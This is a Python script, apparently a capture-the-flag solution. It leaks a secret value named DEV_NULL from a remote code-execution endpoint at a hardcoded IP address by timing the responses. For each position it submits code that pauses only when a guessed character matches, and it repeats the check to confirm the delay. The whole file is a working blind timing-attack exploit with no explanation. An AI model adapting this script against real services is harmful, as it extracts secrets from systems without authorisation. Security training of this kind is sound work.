#!/usr/bin/env python3
import requests
import time

res = ''
while True:
    found = False
    for char in '_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ !"#$%&\'()*+,-./:;<=>?@[\\]^`{|}~abcdefghijklmnopqrstuvwxyz':
        start = time.time()
        # print('if "{}" == charAt(DEV_NULL,{}) then pause(1000) end'.format(char, len(res)))
        result = requests.post(
            'http://35.207.189.79/wee/dev/null',
            json={'code': 'if "{}" == charAt(DEV_NULL,{}) then pause(1000) end'.format(char, len(res))})
        if time.time() - start > 1.5:
            start = time.time()
            result = requests.post(
                'http://35.207.189.79/wee/dev/null',
                json={'code': 'if "{}" == charAt(DEV_NULL,{}) then pause(1000) end'.format(char, len(res))})
            if time.time() - start > 1.5:
                res += char
                print(res)
                found = True
                break
    if not found:
        break
